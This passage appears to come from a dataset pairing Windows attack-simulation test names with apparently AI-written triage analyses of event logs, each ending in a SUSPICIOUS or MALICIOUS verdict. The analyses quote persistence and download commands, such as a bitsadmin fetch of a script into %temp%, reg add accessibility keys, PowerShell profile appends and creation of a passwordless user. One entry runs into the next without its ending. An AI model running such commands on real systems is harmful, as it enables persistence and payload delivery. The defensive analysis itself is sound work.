   - The absence of PowerShell logs, especially given the context (potentially automated actions), is peculiar as adversaries often utilize PowerShell for orchestrating attacks post-exploitation.
   - Security logs do show evidence of elevated privilege tokens being enabled but lack detailed explanation of prior events leading to administrative actions by the user `admin_test`.

### Assessment and Conclusion:

##### Resolution: **MALICIOUS**

- Based on the suspicious and coordinated use of `bitsadmin.exe`, along with command-line operations suggesting file transfers from a potentially unauthorized source, this activity aligns with tactics often used in malware deployment or adversary-in-the-middle style attacks.
- The sequence, remote file interaction, and command execution pattern strongly indicate malicious activity.

### Recommended Actions:

1. **Immediate Isolation:**
   - Isolate the Server002 from the network to prevent further propagation or data exfiltration.

2. **Comprehensive Investigation:**
   - Inspect the contents of the downloaded files and the system for additional signs of compromise or persistent threats.
   - Review policies concerning least privilege, especially for accounts with high-integrity access.

3. **Incident Response:**
   - Engage the incident response team to handle this as a high-priority security incident.
   - Perform endpoint security checks to ensure no backdoors or persistence mechanisms are left on the system.

4. **Use Forensics Tools:**
   - Utilize advanced tools to capture memory images and conduct detailed forensic analysis on the system, including registry and file system analysis.

5. **Notification and Mitigation:**
   - Notify relevant stakeholders and comply with any legal or regulatory requirements regarding potential data breach notifications."
Windows MOFComp.exe Load MOF File,"Based on the provided logs, here is a detailed analysis with a focus on identifying suspicious and possibly malicious activities:

### Analysis of Sysmon and PowerShell Logs:

1. **Frequent Process Executions**:
   - Multiple instances of `wevtutil.exe`, `conhost.exe`, `powershell.exe`, and `svchost.exe` are observed.
   - Frequent use of `whoami.exe`, `wevtutil.exe` and logs indicate the use of PowerShell with mofcomp.exe for Managed Object Format (MOF) compilation. This can be legitimate in some administrative scenarios but may also be suspicious in others, especially when involving temporary directories like `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.003\src\data.003.mof`.

2. **PowerShell Execution Context**:
   - The use of PowerShell along with MOF compilation in a temporary directory may suggest potentially suspicious activity, as attackers could use this for privilege escalation or to maintain persistence.

3. **Application Logs**:
   - There is a notable WMI (Windows Management Instrumentation) Activity with EventID 10, which is associated with a common form of WMI abuse.
   - Use of `edgeupdate` services appears frequently; although software updates are benign, the frequency and nature of the access might require an investigation to ensure it is part of legitimate updating processes and not an attempt to masquerade malicious scripts as part of an update.

4. **Environment and Integrity Levels**:
   - The integrity level is marked as ""High"", implying administrative privileges which is not inherently suspicious but can be risky if the scripts or commands executed are not trusted.

5. **Suspicious Command-line Arguments**:
   - Entries involving PowerShell indicate usage of its ability to embed other commands (`{c:\\windows\\system32\\wbem\\mofcomp.exe ""\\""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.003\\src\\data.003.mof\\""""`), often used by attackers to execute arbitrary commands or scripts with elevated privileges.

### Assessment and Recommendation:

The logs exhibit activities that are common in both administrative tasks and potential compromise scenarios. The use of PowerShell along with MOF compilation, and WMI activity, particularly from temporary locations, are signals that should not be ignored. Specifically, EventID 10 in the application log is indicative of common malicious tactics.

### Final Recommendation:

Based on the analysis above:

- **Resolution**: SUSPICIOUS

Further investigation is warranted as the activities could be indicative of an attempt to exploit privileges or plant something malicious, especially regarding the PowerShell executions and repeated access to `wevtutil.exe` and MOF compilation. It is recommended to:
- Conduct a review of the scripts or binaries executed.
- Verify the integrity and origin of the MOF files.
- Evaluate recent administrative changes or maintenance activities to rule out legitimate use.
- Ensure that all PowerShell scripts are scrutinized and any 'unsanctioned' ones are flagged for further analysis.

By taking these actions, you can better determine if these activities were administrative in nature or indicative of a security event."
Persistent Code Execution Via Word Add-in File (WLL),"### Detailed Analysis of Logs:

**1. Indicators of Malicious Activity:**

- **PowerShell Command Execution:**
  - Multiple PowerShell cmdlets were executed with a script that tries to create a COM object for Word.Application.
  - The script checks if Word is 64-bit or 32-bit and attempts to copy a WLL (Word Add-in) file to the Word startup directory. This action is suspicious and could be indicative of an attempt to perform unauthorized actions or load malicious add-ins through Word.
  - The use of PowerShell to execute the script and copy files to an application's startup directory is a known tactic employed by attackers to maintain persistence and execute malicious payloads upon application start.

- **Repeated Execution of Microsoft Edge Update Processes:**
  - The Sysmon logs show multiple instances of ""MicrosoftEdgeUpdateComRegisterShell64.exe"" being run by the SYSTEM user.
  - The consistent invocation of Microsoft Edge Update-related processes can indicate routine, legitimate behavior for update checks, but can also be leveraged for malicious activities, particularly if actions are out of the ordinary or tied to exploit payloads.

- **Execution of 'whoami' and 'hostname':**
  - The execution of such commands via command line can sometimes be indicative of reconnaissance activity often associated with post-compromise activity as attackers try to figure out more about the compromised host environment.

**2. Anomalous Patterns:**

- **Administrative User Involvement:**
  - Logged activity involving 'SERVER002\\admin_test' with PowerShell and related system processes.
  - Execution of privileged operations (especially those involving system processes and tasks) is worth closer scrutiny to rule out unauthorized access or elevated privileges being used for malicious tasks.

**3. Persistence and Privilege Concerns:**
  - There is a possible exploitation of ADDINS with WLL files being copied into Office Word's Startup path, suggesting potential attempts to load malicious DLLs through Word.

### Assessment and Risks Identified:

The Windows event logs exhibit suspicious activity, especially regarding PowerShell script execution and manipulation of Word startup files. While there is involvement of legitimate tools like Microsoft Edge Update, the pattern and context suggest possible misuse for malicious purposes. 

### Guidance on How to Proceed:

1. **Immediate Actions:**
   - Isolate the affected host (Server002) from the network to prevent potential spread or further unauthorized access.
   - Conduct a forensic analysis on the specific files copied into the Word Startup directory to determine if they are malicious.

2. **Detailed Investigation:**
   - Review PowerShell logs in more detail to determine the origin of the script and the user responsible for execution.
   - Examine network activity around the timestamps of suspicious processes to identify potential data exfiltration or external communication.
   - Check for additional compromised accounts and review user activity logs.

3. **Hardening and Monitoring:**
   - Increase monitoring on PowerShell and system-level processes across all endpoints.
   - Reinforce endpoint protection measures against script-based attacks using PowerShell.
   - Educate users, particularly those with elevated privileges, on recognizing signs of compromise and reporting them.

### Final Resolution:
Based on the analysis and suspicious patterns observed, the resolution is **SUSPICIOUS**. Further in-depth investigation is required to confirm whether these activities are tied to an actual security incident or if they have legitimate purposes that were not immediately evident from the logs reviewed."
Web Shell Written to Disk,"**Analysis of Windows Event Logs from Server002**

**Observations:**

1. **Application Log:**
   - **Windows Defender Activity:** Multiple entries noting ""Windows Defender, SECURITY_PRODUCT_STATE_ON,"" which suggests the security software is active and enabled.
   - **Edge Update Service Stopped:** The ""edgeupdate"" service stopped at one point, which is typical after an update completes, but it also deserves attention if this is not part of a scheduled task.
   - **Software Protection Platform Service (SPP):** No apparent issues; logs a timestamp indicating regular activity.

2. **Sysmon Log:**
   - **PowerShell Activity (Event ID 5):** A PowerShell executable was launched using the user account 'admin_test', followed by 'conhost.exe'. Conhost, or console host, is commonly used with command-line interfaces. This may be routine or part of a script execution.
   - **Use of `wevtutil.exe`:** This tool was executed by 'admin_test'. `wevtutil.exe` is used for managing event logs, which can be concerning if done without clear purpose as it could indicate log tampering.
   - **Execution of `whoami.exe` and `hostname.exe`:** These are benign commands to check current user and system name but their execution in rapid succession can sometimes signal reconnaissance activity.
   - **Execution of `cmd.exe` with xcopy command:** A command to copy files to the `C:\inetpub\wwwroot` directory is suspicious, especially when run from `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.003\src`. This may indicate an attempt to deploy files to a web server directory.
   - **Microsoft Edge Update Activity:** There are multiple entries for `MicrosoftEdgeUpdate.exe` and related processes, which appear to be part of a legitimate update procedure.

**Assessment:**

- The continuous logging and launching of `MicrosoftEdgeUpdate.exe` and ongoing Windows Defender status logs seem consistent with regular system updates.
- The combination of PowerShell execution, `wevtutil.exe`, closely followed by `whoami.exe` and `hostname.exe`, could suggest administrative script execution. However, if such scripts are unauthorized, these could be initial steps in an attack chain to gather system and user info and potentially obfuscate logs.
- The `xcopy` command copying files into `C:\\inetpub\\wwwroot` under `cmd.exe` execution is particularly concerning. It suggests potential modification or pen-testing activity against the web server files which could imply an attempt to gain persistent access or distribute unauthorized content.

**Resolution:**

**SUSPICIOUS**

**Guidance:**
- Verify whether the PowerShell, `wevtutil.exe`, `xcopy`, and related activities were part of scheduled administrative tasks or an authorized script.
- Check the contents and origins of the copied files in `C:\\inetpub\\wwwroot` to ensure they are legitimate and expected.
- Review user account activities (especially `admin_test`) for any abnormal login patterns or privilege escalation attempts.
- If unexpected behavior or unauthorized access is confirmed, consider a broader network forensics investigation and potentially isolate the affected server until clarity is gained."
Persistence via WMI Event Subscription - ActiveScriptEventConsumer,"Upon reviewing the provided event logs, several points stand out which warrant further analysis to determine the nature of activities happening on the host, ""Server002"".

### Suspicious Indicators:

1. **Application Error Logs:**
   - Multiple application crashes of `Sysmon.exe` with error code `c0000005`, which indicates a memory access violation. Although this could be due to a genuine bug in the application, frequent crashes could be exploited or indicative of malware interactions.

2. **PowerShell Activity:**
   - The PowerShell logs show the execution of apparent WMI Persistence methods using `ActiveScriptEventConsumer` and `VBScript`. The execution is using PowerShell commands to set up WMI event subscriptions that execute VBScript, which runs `notepad.exe`. Such scripts are commonly used for persistence mechanisms by adversaries.

3. **Security Logs:**
   - There are logon and privilege escalation activities involving the user `admin_test` within the security logs. Although the privileges listed are significant (`SeDebugPrivilege`, `SeImpersonatePrivilege`, etc.), they do not inherently indicate malicious activity but should be further corroborated with other activities.
   - Several `6281` events indicating potentially unsafe DLLs (`aepic.dll`, `fcon.dll`) were loaded. These events might be valid system operations, but without confirmation, they warrant further scrutiny, especially in conjunction with other anomalous behavior.

### Indicators of Malicious Activity:

- **WMI Persistence via PowerShell:**
  - The WMI persistence script is indicative of malicious intent, especially given its complexity (`__InstanceModificationEvent` filters, `ActiveScriptEventConsumer`). While running `notepad.exe` appears benign, the method of persistence and execution in itself is a tactic utilized by malicious actors to remain persistent on a system.

### Conclusion:

Based on the analysis, the logs contain potential indicators of compromise and signs of suspicious activity, primarily rooted in the usage of PowerShell for setting up WMI subscriptions, alongside application crashes and suspicious DLL loads. The presence of these patterns, while not definitively proving malicious intent, strongly suggests potential threat actor activity.

### Resolution:

- **SUSPICIOUS** - The activities captured by the logs, particularly those involving WMI event consumer and PowerShell, indicate behaviors that are abnormal and potentially harmful. The system should be subjected to a thorough investigation, including examining any persisted scripts or services and validating all loaded DLLs to ensure no malicious components are present.

### Guidance on How to Proceed:

1. **Conduct a Detailed Investigation:**
   - Investigate the cause of `Sysmon.exe` crashes and patch or update the application if necessary.
   - Inspect any WMI event filters and consumers on the system for legitimacy.

2. **Analyze Network Traffic:**
   - Review network logs to trace activities associated with the `admin_test` account and potentially check if there’s any lateral movement or data exfiltration.

3. **Check Security and Patch Levels:**
   - Confirm that the host is fully patched, and security configurations are up-to-date. Address any known vulnerabilities promptly.

4. **Further Logs Review and Correlation:**
   - Correlate findings with other systems to identify any signs of wider intrusion.
   - Analyze if similar event IDs or anomalies exist across the network.

5. **Consider Isolation or Forensics:**
   - Depending on findings, consider isolating the affected system for deeper forensic analysis and potential re-imaging.

By following these actions, you reduce the risk of a potential breach or ongoing malicious activity on the network, leveraging insights drawn from these logs."
Persistent Code Execution Via Excel VBA Add-in File (XLAM),"Based on the provided logs, there are several indicators and patterns that can be analyzed for suspicious or anomalous behavior, particularly focusing on PowerShell and process executions.

### Analysis of the Logs:

1. **PowerShell Execution:**
   - We see multiple instances of PowerShell being executed by `SERVER002\admin_test`. Notably, there is a PowerShell command that executes:
     ```powershell
     Copy ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.006\bin\Addins\ExcelVBAaddin.xlam"" ""$env:APPDATA\Microsoft\Excel\XLSTART\notepad.xlam""
     Start-Process ""Excel""
     ```
   - This command attempts to copy an Excel add-in, which is not a typical user behavior and could indicate an attempt to add a malicious add-in to start with Excel. This operation fails as indicated by the log with a warning, which states:
     ```
     Attempting to perform the CopyItem operation on the 'FileSystem' provider failed for path 'C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.006\bin\Addins\ExcelVBAaddin.xlam'.
     ```
   - This failed attempt, while not successful, still raises a red flag as it represents a common technique used by attackers to persist or introduce malicious macro code.

2. **Unusual Process Executions:**
   - A series of Sysmon event logs capture a large number of potentially unrelated processes being executed in quick succession. These include multiple instances of `powershell.exe`, `conhost.exe`, `wevtutil.exe`, and others under the context of `SERVER002\admin_test`. 
   - Notably, `wevtutil.exe` and `conhost.exe` are spawned multiple times in correlation with PowerShell activity, which can be indicative of scripting or automated task running scripts either for reconnaissance or modification of event logs.

3. **Process Integrity and User Context:**
   - The integrity level of many processes executed is `High`, indicating they are running with elevated privileges, which compounds the concern if being exploited incorrectly.
   - The execution of standard Windows utilities under `NT AUTHORITY\SYSTEM` is normal for updates but needs to be cross-validated with actual scheduled task actions to confirm the legitimacy of each action, like the ones for Edge Update processes.
  
4. **Edge Update Activity:**
   - There are multiple events related to Microsoft Edge Update, which may simply represent automatic updates or installs of new versions. The logs show appropriate parent-child relationships consistent with a legitimate update process.
   - While Microsoft Edge update activities can explain indicative patterns normally associated with updates, these do not directly align with any suspicious activities usually indicative of compromise based on typical Windows patterns.

### Conclusion:

Based on the analysis of the provided logs, particularly concerning PowerShell's execution with the copying of a file to an Excel add-in directory and processes executed with elevated permissions, this set of activities should be classified under **SUSPICIOUS**. There is suspicious behavior that warrants further investigation:

- The failed PowerShell command intended to manipulate Excel start-up items suggests potential initial stages of compromise, which is a common vector for launching VBA-based attacks.
- Unusual execution patterns of administrative utilities, along with attempts to use PowerShell in this manner, usually demand verification of users and correlated monitoring across other systems/tools for signs of unauthorized access or exploits.

### Recommendations for Response:

- Conduct a thorough investigation of the user `admin_test`, verifying if activities align with standard behavior.
- Inspect the source and intention behind the failed PowerShell command and validate if there are associated listed threats.
- Review any other logs from machines in similar environments to search for other instances or patterns.
- Implement enhanced monitoring and establish alerts for PowerShell scripting activities for early detection of potential scripts executing in this manner.
- Potentially restrict PowerShell execution for users where full administrative permissions are not necessary."
Google Chrome Load Unpacked Extension With Command Line,"### Detailed Analysis of Event Logs

#### 1. **Suspicious PowerShell Activity**
   - **PowerShell Script Execution**: The logs indicate a PowerShell script was executed which downloaded a Chromium browser from an unofficial source and a uBlock Origin Lite extension for side-loading. This type of activity could be used for setting up a temporary browser environment for browsing potentially malicious sites or bypassing some security measures.
   - **Command Line Details**: The command observed involves downloading and unpacking files directly from the internet and executing a browser: 
     ```
     powershell.exe & {# Chromium
     $chromium = ""https://commondatastorage.googleapis.com/chromium-browser-snapshots/Win_x64/1153778/chrome-win.zip""
     ...
     Start-Process .\\chrome-win\\chrome.exe --load-extension=\""$env:TEMP\\extension\\\"" -PassThru}
     ```
   - **Behavioral Red Flags**: There are several concerning points:
     - Downloading executable content directly via PowerShell.
     - Installing a browser extension in an unusual manner.
     - The absence of official or trusted sources in the download URLs.

#### 2. **Executed Commands and Processes**
   - `wevtutil.exe` and `conhost.exe` were seen executing, but these could be legitimate. However, the use of such utilities without clear, documented agenda can sometimes be indicative of log tampering or attempts to cover tracks after unauthorized actions.
   - `whoami.exe` was run, which might be indicative of checking user permissions, potentially by an attacker.

#### 3. **Microsoft Edge Update Process**
   - There are numerous entries related to `MicrosoftEdgeUpdate.exe` which involve standard update procedures. Although verbose, this appears to be part of normal system operations unless any anomalous behavior or versioning is detected. However, multiple instances with different arguments do require a closer look to ensure it’s not being exploited.

#### 4. **Time Synchronization Events**
   - The `Microsoft-Windows-Time-Service` and `Microsoft-Windows-Kernel-General` logs show that the system time was synchronized with a verified NTP server. Such changes do not inherently indicate malicious activity but should be verified for consistency in timing and source, especially if any timelines of noted actions seem misaligned.

#### 5. **Host Processes and Network Service Activities**
   - The processes involving `taskhostw.exe`, `wermgr.exe`, and others related to `svchost.exe` are expected for system operations and appear under the correct system authority users.

### Assessment
- **Primary Concern**: The use of PowerShell to execute scripts that download and run data from an external source stands out as highly concerning. This sort of behavior is often associated with malware installation, data exfiltration, or sandbox/bypassing activities.
- **Possible Threat**: The aforementioned PowerShell activity could be indicative of preparing an environment outside normal security policies, potentially leading to web browsing or data handling that bypasses usual controls.
- **Legitimate System Processes**: While there are multiple Edge updates logged, they appear to follow typical auto-update patterns.

### Guidance and Resolution
- **Resolution**: **SUSPICIOUS**
- **Next Steps**:
  - **Deep Dive Analysis**: Conduct a thorough investigation into PowerShell usage by cross-verifying with user activities and ensuring the authenticity of the script commands executed.
  - **Network Traffic Review**: Inspect outgoing network traffic logs for similar timeframes correlating with the mentioned PowerShell commands to identify any potential unauthorized data exfiltration or suspicious activities.
  - **Threat Detection Solutions**: Utilize endpoint detection systems to assess if any anomaly detection alerts were triggered within the period of interest.
  - **User Verification**: Confirm that the account (`SERVER002\\admin_test`) performing these actions was legitimate and correctly authenticated. Consider the possibility of compromised admin credentials or privilege escalation scenarios.
  - **System Security**: Apply additional monitoring and perhaps isolate or sandbox the activities of administrative users until a complete review and assurance of no further suspicious activities are confirmed."
Auto-start application on user logon,"Upon analyzing the provided Windows event logs, several activities suggest potential indicators of compromise. Here are the key observations:

1. **Registry Modifications via Command Line:**
   - The Sysmon logs reveal the execution of `cmd.exe` with a series of `reg add` commands, which are suspicious:
     - ```cmd.exe /c reg add ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test"" /f ...```
   - Such registry modifications appear to configure or embed potentially malicious behavior by using the `Accessibility` settings of Windows to execute unauthorized code.

2. **High Integrity Process Actions:**
   - The commands were executed by `SERVER002\admin_test` with high integrity level, indicating administrative privileges were employed in executing these registry changes. This could signal a potential privilege escalation or misuse of legitimate credentials.

3. **Various Process Executions with Elevated Privileges:**
   - There are multiple instances of processes running via `SERVER002\admin_test` with administrative privileges. These range from benign-looking updates and system utilities (`hostname.exe`, `whoami.exe`) to more concerning activities.
  
4. **PowerShell and Edge Updates:**
   - The logs do not show any direct PowerShell suspicious scripts being executed. However, there is significant activity related to Microsoft Edge Update (`MicrosoftEdgeUpdate.exe`) which could be routine but given the context of other suspicious activity should be revisited for legitimacy.

5. **Time Zone Change & Kernel General Events:**
   - Repeated adjustments on the system clock (`EventID 4616`). Although time change logs themselves are not inherently malicious, they may indicate attempt to obfuscate system logs time-stamps and evade log-based detection mechanisms if part of a larger pattern.

Overall, the combination of registry modifications aimed at using the ""Accessibility"" feature in a potentially nefarious manner, execution of administrative processes with what appears to be scripted command lines, and high integrity-level executions all point towards potentially illicit activity.

### Resolution
Given the findings, the activity documented in the logs cannot be conclusively confirmed as benign or malicious without further context or investigation. The manipulation of the registry and use of potentially unintended Windows features for persistence suggest the activities are:

- **SUSPICIOUS -** The activity in the logs does not look right and necessitates further investigation to ascertain intent, origin, and potential impact on the system.

### Recommendations
- **Conduct Further Investigation:**
  - Investigate the source and authorization of the registry modifications.
  - Determine if the `SERVER002\admin_test` account was supposed to execute the suspicious commands, and if not, consider credential compromise.
  - Verify if any recent updates to Microsoft Edge were expected or if they could be a potential smokescreen.

- **System Forensics:**
  - Snapshot and backup current system states and logs for in-depth analysis and future reference.
  - Examine any scheduled tasks or scripts associated with these processes for additional unauthorized behavior.

- **Increase Monitoring:**
  - Increase the logging and review frequency of similar events in the organizational environment.
  - Implement alerts for execution of high-integrity commands and registry changes, especially those mimicking this pattern."
Append malicious start-process cmdlet,"## Detailed Analysis

### PowerShell Logs
The PowerShell logs contain the following notable events:
1. A series of events indicating the execution of a PowerShell command that modifies the user profile to include the command `Start-Process calc.exe`.
   - **TimeStamp**: 2024-10-27 14:48:55.5185462
   - **EventRecordID**: 1067 - 1072
   - **Command**: `powershell.exe & {Add-Content $profile -Value """" Start-Process calc.exe powershell -Command exit}`

This sequence points towards a persistent mechanism to execute the calculator application (`calc.exe`) each time a PowerShell session is started. This behavior is abnormal as it automates process launching without an apparent legitimate purpose, potentially indicating malicious intent or a testing/debugging scenario.

### Security Logs
- Multiple instances of Event ID 4624 (Logon) and 4672 (Special privileges assigned to a new logon) were observed for the `SYSTEM` user. The presence of privileged operations like `SeDebugPrivilege` is normal under system context.
- **Event IDs 5379** indicating failed credential validation for Microsoft accounts are benign but worth noting if continuous.

### Application Logs
- Logs include routine operations related to Microsoft Edge updates with no anomalous entries directly indicating malice.

### Sysmon Logs
- Event captured **PowerShell** execution with the specific command that aligns with PowerShell logs.
- Multiple instances of known system processes like `svchost.exe`, `CompatTelRunner.exe`, and `WmiPrvSE.exe` were observed performing routine tasks which are not inherently suspicious.

### Anomalies and Threats
1. The PowerShell activity that appends commands to start `calc.exe` persistently could be a precursor to more malicious operations or may serve as an initial test of persistence mechanisms by an attacker or script.
2. The modification of PowerShell profiles in this manner is a common tactic in various malware to maintain persistence or even perform regular actions which might serve as a distraction.

### Guidance
- Investigate the context of the `Add-Content` command within PowerShell scripts, confirming whether it was initiated by a known user or automated tool.
- Verify the integrity of PowerShell profiles and scripts, considering reverting any unauthorized changes.
- Consider enabling further PowerShell logging to detect scripts executed upon module loading.
- Continue monitoring for additional suspicious entries across logs over time, particularly for unusual script executions outside of normal administrative activity.

## Resolution: SUSPICIOUS
Based on the presence of unusual PowerShell activity within the logs indicating persistent control without immediate contextual clarity, the activity is flagged as SUSPICIOUS. Further investigation is required to ascertain intentions and remediate as necessary."
Create a new user in PowerShell,"After analyzing the provided Windows event logs, several observations can be made regarding the activities on Server002:

### Suspicious Activity:

1. **User Account Creation without Password:**
   - The Windows PowerShell logs indicate the execution of the `New-LocalUser` cmdlet to create a new user account named `data.001_PowerShell` without a password (`-NoPassword`). Creating user accounts without passwords is uncommon and potentially risky, as it can be exploited for unauthorized access.

2. **Privileged User Activity:**
   - The security logs show that the user `admin_test` performed the operations related to account creation and group modification. This user has several high privileges assigned (e.g., SeDebugPrivilege, SeBackupPrivilege), indicating that they have administrative control over the system.

3. **Immediate User Addition to Group:**
   - The `data.001_PowerShell` user was quickly added to a group with actions performed by `admin_test`. This rapid modification of group memberships right after account creation is atypical and may suggest preparation for misuse.

4. **Time-related Changes:**
   - There are entries indicating system time changes by svchost.exe, suggesting possible attempts to manipulate time for security log confusion or log evasion.

5. **Sysmon Logging:**
   - The execution of PowerShell by `admin_test` is logged in Sysmon, aligning with the creation of the `data.001_PowerShell` user. Logged events show administrative access with high integrity, consistent with malicious or suspicious administrative actions.

6. **EdgeUpdate Executions:**
   - Numerous EdgeUpdate-related activities are logged, appearing periodic and consistent with typical update service behavior. There doesn’t seem to be an anomaly here, but it is an aspect to monitor continuously.

### Assessment:

The logs reflect a scenario where a high-privilege user (`admin_test`) created a new local user account without a password and conducted user group modifications. These activities are suspicious and suggest potential unauthorized actions that could compromise the system. The lack of password adds an additional layer of concern regarding unauthorized access.

### Resolution:
**SUSPICIOUS**

The actions recorded in the logs require further investigation to ensure no unauthorized or malicious intent is behind them. It is recommended to:

1. **Verify Purpose:**
   - Confirm with relevant personnel if the creation of the `data.001_PowerShell` account was intentional and whether it aligns with any current administrative requirement.

2. **Review Access Logs:**
   - Examine further log entries for any subsequent logon or unexpected activities involving the `data.001_PowerShell` account.

3. **Secure the Environment:**
   - If the account was accidentally created, immediately secure it by setting a password, disabling it, or completely removing it.

4. **Audit `admin_test` Activities:**
   - Conduct a thorough review of actions taken by `admin_test` during the log timeline to ensure no other unauthorized changes were made.

5. **Enhance Logging and Alerting:**
   - Implement or enhance current alerting mechanisms to notify the security team promptly of any further unusual or unauthorized activities.

Engaging in these steps will help clarify the intent behind these actions and mitigate any possible risks associated with them."
Bitsadmin Download (cmd),"Upon reviewing the provided event logs, there are some observations and assessments to be made about potential malicious activity or compromise:

### Main Observations:

1. **Process Execution:**
   - **cmd.exe Execution:** There is an execution of `cmd.exe` with the command line: 
     ```
     ""cmd.exe"" /c bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/file/file-file/master/files/data/data.md %%temp%%\\bitsadmin1_flag.ps1
     ```
     This command uses `bitsadmin.exe` to download a file from the internet, which can be a sign of suspicious activity, particularly if `bitsadmin.exe` is used as part of a script or malware payload delivery. This is a classic technique used by attackers to download malicious scripts or binaries to a victim's system. The use of GitHub as a source may indicate an attempt to evade network defenses.

2. **Use of System Tools:**
   - **Sysmon Entries:** There are numerous Sysmon entries involving the standard system utilities such as `svchost.exe`, `wevtutil.exe`, and others like `whoami.exe` operated by the user `SERVER002\\admin_test`. While these alone are not indicative of malicious activity, their excessive or unusual use in a short period, particularly `wevtutil.exe`, which is used for managing event logs, can hint at potential log tampering or information gathering.
   
3. **Software Update Activity:**
   - There is extensive activity involving Microsoft Edge Update processes like `MicrosoftEdgeUpdate.exe` and related setup executables. These activities seem consistent with an update or installation process. However, the repetitive and quick succession of such process executions calls for validation of their source and legitimacy.

4. **High Integrity Level:** 
   - Processes are executed at a high integrity level, such as `cmd.exe`. This execution context allows significant control over the system, which could be used for both administrative purposes or cyber attacks.

- **Verify Edge Update Legitimacy:** Ensure that the Edge Updates and related processes are legitimate and part of a scheduled or expected update cycle. Confirm the integrity and source of the Edge update files.
- **Review Log Data:** Investigate the `wevtutil.exe` usage to determine if logs may have been manipulated to hide further activities.
- **Conduct Threat Hunting:** Search for any other unusual files, scripts, or activity within the system, particularly focusing on file integrity and network connections during the timeframe of these events.

### Resolution: **SUSPICIOUS**

The logs indicate suspicious activity, specifically due to the `bitsadmin.exe` download process, and further investigation is needed to determine the intent and impact of this activity."
Office Application Startup - Outlook as a C2,"### Analysis of Windows Event Logs:

#### Observations:

1. **Security Log (EventID 4616) - Time Change Events:**
   - There are entries indicating a system time change. This is typically logged under Event ID 4616. The `svchost.exe` process is involved.
   - The time change events appear to reflect a very slight adjustment, possibly a result of a manual or automated time synchronization attempt.

2. **Sysmon Log (EventID 1 and 5) - Process Creation and Termination:**
   - Regular system processes such as `hostname.exe`, `conhost.exe`, `whoami.exe`, and `wevtutil.exe` were executed by the user `admin_test` with a high integrity level.
   - However, a series of these processes executed in quick succession could indicate scripting or automation activity involving command-line operations.
   - Notably, `cmd.exe` is used to execute commands for registry modification and file manipulation in the user's `APPDATA` directory. It includes:
     - Adding a registry key for Microsoft Office Outlook security settings.
     - Creating and writing to a file named `VbaProject.OTM` in the Outlook directory, potentially indicative of scripting or macro usage.

3. **Application Log - Software Protection Platform:**
   - The `Microsoft-Windows-Security-SPP` entry is related to the Software Protection Platform Service, which generally checks the system software licensing state.

4. **System Log - Kernel and Time Service:**
   - These logs are consistent with the slight time synchronization noted under the security logs.
   - The time source has been chosen as an NTP server, likely indicating synchronization from an external time source.

#### Assessment:

- **Benign Activities:**
  - Time synchronization activities and the involvement of `svchost.exe` for these actions can be fairly typical in a networked Windows environment.

- **Suspicious Activities:**
  - The execution of `cmd.exe` to modify registry settings and file operations related to Outlook in the application data folder is indicative of potential unauthorized configuration changes.
  - Such actions could be attempts to manipulate Outlook's behavior, possibly preparing the environment for macro-enabled attacks.
  - The presence of high-integrity levels for these command executions could indicate attempts to apply changes with elevated privileges.

Create Symbolic Link From osk.exe to cmd.exe,"### Detailed Analysis:

Upon detailed review of the provided log entries from several Windows event logs, I have identified some points that may warrant additional attention:

#### 1. **System Log:**
- **Time Change Events:** The logs indicate multiple updates to the system time (EventID 1 from Microsoft-Windows-Kernel-General), with `svchost.exe` being noted as the process involved. The Windows Time Service (event source: `Microsoft-Windows-Time-Service`) mentions `time.windows.com` as the source. Time changes can often result from legitimate time synchronization processes, thus considered benign in this context, provided the source is verified and known.

#### 2. **Sysmon Log:**
- **Process Executions:**
  - **cmd.exe Execution with Unusual Command Line:** A `cmd.exe` process is executed with a command line that appears to manipulate the `osk.exe` (On-Screen Keyboard) by replacing it with `cmd.exe`. This type of behavior is often indicative of a potential attempt to backdoor or escalate privileges, particularly by creating junctions/symlinks using administrative privileges.
  - **High Integrity Level Executions:** There are several processes executed with a high integrity level (`admin_test` user), which is often normal in server environments, but should still be verified in context.
  - **Routine Executions of HOSTNAME.EXE and WHOAMI.EXE:** These processes are usually benign and common for diagnostic purposes, but can be suspicious when executed in sequences or by unauthorized users.

#### 3. **Security Log:**
- **Logon and Privilege Escalation Events:**
  - **Admin User (admin_test) Privilege Assignment:** The user `admin_test` is granted significant privileges (`SeSecurityPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, and others) indicating high access capability. This is not uncommon for administrative tasks, but combined with the execution of command line scripts for symlink creation could be suspicious if unauthorized.

#### 4. **Application Log:**
- **SPP Event:** The log does not reveal any immediate concerns, showing routine activities related to the Software Protection Platform.

#### 5. **Overall Concern:**
- The key point of concern is the command executed through `cmd.exe` involving file operations on `osk.exe`, typically a target for privilege escalation attacks. This activity appears to be intentionally crafted to mask the command prompt as an accessibility application, which is a known tactic for maintaining high access.

### Conclusion:
Based on the command line being used and the privilege escalation indications, the activity could potentially represent a malicious attempt to gain and maintain unauthorized access. Given that certain behaviors demonstrate common attack vectors involving privilege escalation, this case warrants further investigation.

#### Resolution: **SUSPICIOUS**

### Guidance on How to Proceed:
1. **User Validation:** Verify the legitimacy of the actions undertaken by the user `admin_test`. Check with the responsible team or individual.
2. **System Audit:** Assess all involved files (`osk.exe`, `cmd.exe`) for unauthorized modifications or replacements.
3. **Network Traffic Analysis:** Verify any unusual outbound connections, especially around the time of these events.
4. **Threat Hunting:** Use additional threat intelligence tools to monitor for known indicators of compromise (IOCs) related to the command observed.
5. **Ensure Systems are Patched:** Double check for any system vulnerabilities or missing patches that may mitigate exploit attempts leveraging privilege escalation. 

It is recommended to isolate the system if any further unauthorized modifications or behaviors are observed during additional auditing and analysis."
Netsh Helper DLL Registration,"Upon examining the logs provided, I've identified several points of interest that could potentially indicate anomalous or malicious behavior. Here's a detailed breakdown of observations:

### Suspicious Findings:

1. **Unusual Command Line Arguments:**
   - The command line execution of `cmd.exe` included the addition of a network helper DLL (`NetshHelper.dll`) from a temporary directory and subsequent termination of `notepad.exe`. This action could indicate an attempt to establish persistence or inject custom functionality into network configurations.
   - Commands involving `netsh.exe` and manipulation of DLLs (`""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.007\\bin\\NetshHelper.dll""`) stand out as suspicious. This could represent an attempt to compromise network settings or alter system configurations.

